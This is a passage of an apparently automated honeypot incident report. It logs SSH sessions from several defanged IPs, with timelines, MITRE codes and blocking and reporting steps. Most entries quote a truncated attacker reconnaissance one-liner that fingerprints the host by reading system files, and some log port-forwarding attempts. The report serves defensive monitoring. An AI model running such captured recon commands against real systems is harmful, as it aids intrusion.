**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:24:52` | `cowrie.session.connect` |
| `2026-08-10 18:24:52` | `cowrie.client.version` |
| `2026-08-10 18:24:53` | `cowrie.client.kex` |
| `2026-08-10 18:24:55` | `cowrie.login.success` |
| `2026-08-10 18:24:56` | `cowrie.session.params` |
| `2026-08-10 18:24:56` | `cowrie.command.input` |
| `2026-08-10 18:24:56` | `cowrie.log.closed` |
| `2026-08-10 18:24:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.28.138[.]88` to AbuseIPDB if not already reported
- [ ] Block `149.28.138[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24397fae2d38

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-08-10 18:26 |
| **Last Seen** | 2026-08-10 18:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:26:30` | `cowrie.session.connect` |
| `2026-08-10 18:26:30` | `cowrie.client.version` |
| `2026-08-10 18:26:30` | `cowrie.client.kex` |
| `2026-08-10 18:26:32` | `cowrie.login.success` |
| `2026-08-10 18:26:35` | `cowrie.session.params` |
| `2026-08-10 18:26:35` | `cowrie.command.input` |
| `2026-08-10 18:26:35` | `cowrie.command.input` |
| `2026-08-10 18:26:35` | `cowrie.command.input` |
| `2026-08-10 18:26:35` | `cowrie.command.input` |
| `2026-08-10 18:26:35` | `cowrie.command.input` |
| `2026-08-10 18:26:35` | `cowrie.command.success` |
| `2026-08-10 18:26:35` | `cowrie.command.input` |
| `2026-08-10 18:26:35` | `cowrie.command.input` |
| `2026-08-10 18:26:35` | `cowrie.command.input` |
| `2026-08-10 18:26:35` | `cowrie.command.input` |
| `2026-08-10 18:26:36` | `cowrie.log.closed` |
| `2026-08-10 18:26:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7fe8c5980df

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-08-10 18:29 |
| **Last Seen** | 2026-08-10 18:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:29:11` | `cowrie.session.connect` |
| `2026-08-10 18:29:12` | `cowrie.client.version` |
| `2026-08-10 18:29:12` | `cowrie.client.kex` |
| `2026-08-10 18:29:15` | `cowrie.login.success` |
| `2026-08-10 18:29:17` | `cowrie.session.params` |
| `2026-08-10 18:29:17` | `cowrie.command.input` |
| `2026-08-10 18:29:17` | `cowrie.command.input` |
| `2026-08-10 18:29:17` | `cowrie.command.input` |
| `2026-08-10 18:29:17` | `cowrie.command.input` |
| `2026-08-10 18:29:17` | `cowrie.command.input` |
| `2026-08-10 18:29:17` | `cowrie.command.success` |
| `2026-08-10 18:29:17` | `cowrie.command.input` |
| `2026-08-10 18:29:17` | `cowrie.command.input` |
| `2026-08-10 18:29:17` | `cowrie.command.input` |
| `2026-08-10 18:29:17` | `cowrie.command.input` |
| `2026-08-10 18:29:17` | `cowrie.log.closed` |
| `2026-08-10 18:29:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad167866e510

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-08-10 18:34 |
| **Last Seen** | 2026-08-10 18:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:34:06` | `cowrie.session.connect` |
| `2026-08-10 18:34:07` | `cowrie.client.version` |
| `2026-08-10 18:34:07` | `cowrie.client.kex` |
| `2026-08-10 18:34:10` | `cowrie.login.success` |
| `2026-08-10 18:34:12` | `cowrie.session.params` |
| `2026-08-10 18:34:12` | `cowrie.command.input` |
| `2026-08-10 18:34:12` | `cowrie.command.input` |
| `2026-08-10 18:34:12` | `cowrie.command.input` |
| `2026-08-10 18:34:12` | `cowrie.command.input` |
| `2026-08-10 18:34:12` | `cowrie.command.input` |
| `2026-08-10 18:34:12` | `cowrie.command.success` |
| `2026-08-10 18:34:12` | `cowrie.command.input` |
| `2026-08-10 18:34:12` | `cowrie.command.input` |
| `2026-08-10 18:34:12` | `cowrie.command.input` |
| `2026-08-10 18:34:12` | `cowrie.command.input` |
| `2026-08-10 18:34:13` | `cowrie.log.closed` |
| `2026-08-10 18:34:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fe083e08cad

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-08-10 18:36 |
| **Last Seen** | 2026-08-10 18:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:36:33` | `cowrie.session.connect` |
| `2026-08-10 18:36:34` | `cowrie.client.version` |
| `2026-08-10 18:36:34` | `cowrie.client.kex` |
| `2026-08-10 18:36:37` | `cowrie.login.success` |
| `2026-08-10 18:36:39` | `cowrie.session.params` |
| `2026-08-10 18:36:39` | `cowrie.command.input` |
| `2026-08-10 18:36:39` | `cowrie.command.input` |
| `2026-08-10 18:36:39` | `cowrie.command.input` |
| `2026-08-10 18:36:39` | `cowrie.command.input` |
| `2026-08-10 18:36:39` | `cowrie.command.input` |
| `2026-08-10 18:36:39` | `cowrie.command.success` |
| `2026-08-10 18:36:39` | `cowrie.command.input` |
| `2026-08-10 18:36:39` | `cowrie.command.input` |
| `2026-08-10 18:36:39` | `cowrie.command.input` |
| `2026-08-10 18:36:39` | `cowrie.command.input` |
| `2026-08-10 18:36:42` | `cowrie.log.closed` |
| `2026-08-10 18:36:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ff9ad48c769

| Field | Detail |
|---|---|
| **Source IP** | `211.43.139[.]142` |
| **First Seen** | 2026-08-10 18:37 |
| **Last Seen** | 2026-08-10 18:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:37:32` | `cowrie.session.connect` |
| `2026-08-10 18:37:33` | `cowrie.client.version` |
| `2026-08-10 18:37:33` | `cowrie.client.kex` |
| `2026-08-10 18:37:35` | `cowrie.login.success` |
| `2026-08-10 18:37:36` | `cowrie.direct-tcpip.request` |
| `2026-08-10 18:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.43.139[.]142` to AbuseIPDB if not already reported
- [ ] Block `211.43.139[.]142` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25b46488379e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-08-10 18:38 |
| **Last Seen** | 2026-08-10 18:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:38:55` | `cowrie.session.connect` |
| `2026-08-10 18:38:56` | `cowrie.client.version` |
| `2026-08-10 18:38:56` | `cowrie.client.kex` |
| `2026-08-10 18:38:59` | `cowrie.login.success` |
| `2026-08-10 18:39:01` | `cowrie.session.params` |
| `2026-08-10 18:39:01` | `cowrie.command.input` |
| `2026-08-10 18:39:01` | `cowrie.command.input` |
| `2026-08-10 18:39:01` | `cowrie.command.input` |
| `2026-08-10 18:39:01` | `cowrie.command.input` |
| `2026-08-10 18:39:01` | `cowrie.command.input` |
| `2026-08-10 18:39:01` | `cowrie.command.success` |
| `2026-08-10 18:39:01` | `cowrie.command.input` |
| `2026-08-10 18:39:01` | `cowrie.command.input` |
| `2026-08-10 18:39:01` | `cowrie.command.input` |
| `2026-08-10 18:39:01` | `cowrie.command.input` |
| `2026-08-10 18:39:01` | `cowrie.log.closed` |
| `2026-08-10 18:39:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-495134a5f1b0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-08-10 18:41 |
| **Last Seen** | 2026-08-10 18:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:41:18` | `cowrie.session.connect` |
| `2026-08-10 18:41:19` | `cowrie.client.version` |
| `2026-08-10 18:41:19` | `cowrie.client.kex` |
| `2026-08-10 18:41:21` | `cowrie.login.success` |
| `2026-08-10 18:41:22` | `cowrie.session.params` |
| `2026-08-10 18:41:22` | `cowrie.command.input` |
| `2026-08-10 18:41:22` | `cowrie.command.input` |
| `2026-08-10 18:41:22` | `cowrie.command.input` |
| `2026-08-10 18:41:22` | `cowrie.command.input` |
| `2026-08-10 18:41:22` | `cowrie.command.input` |
| `2026-08-10 18:41:22` | `cowrie.command.success` |
| `2026-08-10 18:41:22` | `cowrie.command.input` |
| `2026-08-10 18:41:22` | `cowrie.command.input` |
| `2026-08-10 18:41:22` | `cowrie.command.input` |
| `2026-08-10 18:41:22` | `cowrie.command.input` |
| `2026-08-10 18:41:22` | `cowrie.log.closed` |
| `2026-08-10 18:41:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0de8575df46e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-08-10 18:43 |
| **Last Seen** | 2026-08-10 18:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:43:45` | `cowrie.session.connect` |
| `2026-08-10 18:43:46` | `cowrie.client.version` |
| `2026-08-10 18:43:46` | `cowrie.client.kex` |
| `2026-08-10 18:43:47` | `cowrie.login.success` |
| `2026-08-10 18:43:49` | `cowrie.session.params` |
| `2026-08-10 18:43:49` | `cowrie.command.input` |
| `2026-08-10 18:43:49` | `cowrie.command.input` |
| `2026-08-10 18:43:49` | `cowrie.command.input` |
| `2026-08-10 18:43:49` | `cowrie.command.input` |
| `2026-08-10 18:43:49` | `cowrie.command.input` |
| `2026-08-10 18:43:49` | `cowrie.command.success` |
| `2026-08-10 18:43:49` | `cowrie.command.input` |
| `2026-08-10 18:43:49` | `cowrie.command.input` |
| `2026-08-10 18:43:49` | `cowrie.command.input` |
| `2026-08-10 18:43:49` | `cowrie.command.input` |
| `2026-08-10 18:43:50` | `cowrie.log.closed` |
| `2026-08-10 18:43:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79f1ca276d09

| Field | Detail |
|---|---|
| **Source IP** | `124.152.90[.]68` |
| **First Seen** | 2026-08-10 18:43 |
| **Last Seen** | 2026-08-10 18:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:43:54` | `cowrie.session.connect` |
| `2026-08-10 18:43:54` | `cowrie.client.version` |
| `2026-08-10 18:43:54` | `cowrie.client.kex` |
| `2026-08-10 18:43:56` | `cowrie.login.success` |
| `2026-08-10 18:43:57` | `cowrie.direct-tcpip.request` |
| `2026-08-10 18:44:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.152.90[.]68` to AbuseIPDB if not already reported
- [ ] Block `124.152.90[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a603bcdb026c

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]131` |
| **First Seen** | 2026-08-10 18:44 |
| **Last Seen** | 2026-08-10 18:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:44:06` | `cowrie.session.connect` |
| `2026-08-10 18:44:06` | `cowrie.client.version` |
| `2026-08-10 18:44:06` | `cowrie.client.kex` |
| `2026-08-10 18:44:08` | `cowrie.login.success` |
| `2026-08-10 18:44:09` | `cowrie.direct-tcpip.request` |
| `2026-08-10 18:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]131` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e89276e33ae3

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-08-10 18:44 |
| **Last Seen** | 2026-08-10 18:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:44:07` | `cowrie.session.connect` |
| `2026-08-10 18:44:09` | `cowrie.client.version` |
| `2026-08-10 18:44:09` | `cowrie.client.kex` |
| `2026-08-10 18:44:11` | `cowrie.login.success` |
| `2026-08-10 18:44:11` | `cowrie.direct-tcpip.request` |
| `2026-08-10 18:44:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f7618b9e54d

| Field | Detail |
|---|---|
| **Source IP** | `119.160.166[.]237` |
| **First Seen** | 2026-08-10 18:44 |
| **Last Seen** | 2026-08-10 18:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:44:16` | `cowrie.session.connect` |
| `2026-08-10 18:44:17` | `cowrie.client.version` |
| `2026-08-10 18:44:17` | `cowrie.client.kex` |
| `2026-08-10 18:44:20` | `cowrie.login.success` |
| `2026-08-10 18:44:21` | `cowrie.direct-tcpip.request` |
| `2026-08-10 18:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.160.166[.]237` to AbuseIPDB if not already reported
- [ ] Block `119.160.166[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13654fb90ede

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-08-10 18:46 |
| **Last Seen** | 2026-08-10 18:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:46:07` | `cowrie.session.connect` |
| `2026-08-10 18:46:07` | `cowrie.client.version` |
| `2026-08-10 18:46:07` | `cowrie.client.kex` |
| `2026-08-10 18:46:09` | `cowrie.login.success` |
| `2026-08-10 18:46:10` | `cowrie.session.params` |
| `2026-08-10 18:46:10` | `cowrie.command.input` |
| `2026-08-10 18:46:10` | `cowrie.command.input` |
| `2026-08-10 18:46:10` | `cowrie.command.input` |
| `2026-08-10 18:46:10` | `cowrie.command.input` |
| `2026-08-10 18:46:10` | `cowrie.command.input` |
| `2026-08-10 18:46:10` | `cowrie.command.success` |
| `2026-08-10 18:46:10` | `cowrie.command.input` |
| `2026-08-10 18:46:10` | `cowrie.command.input` |
| `2026-08-10 18:46:10` | `cowrie.command.input` |
| `2026-08-10 18:46:10` | `cowrie.command.input` |
| `2026-08-10 18:46:11` | `cowrie.log.closed` |
| `2026-08-10 18:46:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cda7f225be4a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-08-10 18:48 |
| **Last Seen** | 2026-08-10 18:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:48:24` | `cowrie.session.connect` |
| `2026-08-10 18:48:24` | `cowrie.client.version` |
| `2026-08-10 18:48:24` | `cowrie.client.kex` |
| `2026-08-10 18:48:27` | `cowrie.login.success` |
| `2026-08-10 18:48:29` | `cowrie.session.params` |
| `2026-08-10 18:48:29` | `cowrie.command.input` |
| `2026-08-10 18:48:29` | `cowrie.command.input` |
| `2026-08-10 18:48:29` | `cowrie.command.input` |
| `2026-08-10 18:48:29` | `cowrie.command.input` |
| `2026-08-10 18:48:29` | `cowrie.command.input` |
| `2026-08-10 18:48:29` | `cowrie.command.success` |
| `2026-08-10 18:48:29` | `cowrie.command.input` |
| `2026-08-10 18:48:29` | `cowrie.command.input` |
| `2026-08-10 18:48:29` | `cowrie.command.input` |
| `2026-08-10 18:48:29` | `cowrie.command.input` |
| `2026-08-10 18:48:29` | `cowrie.log.closed` |
| `2026-08-10 18:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fddb7b6dd620

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-08-10 18:50 |
| **Last Seen** | 2026-08-10 18:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
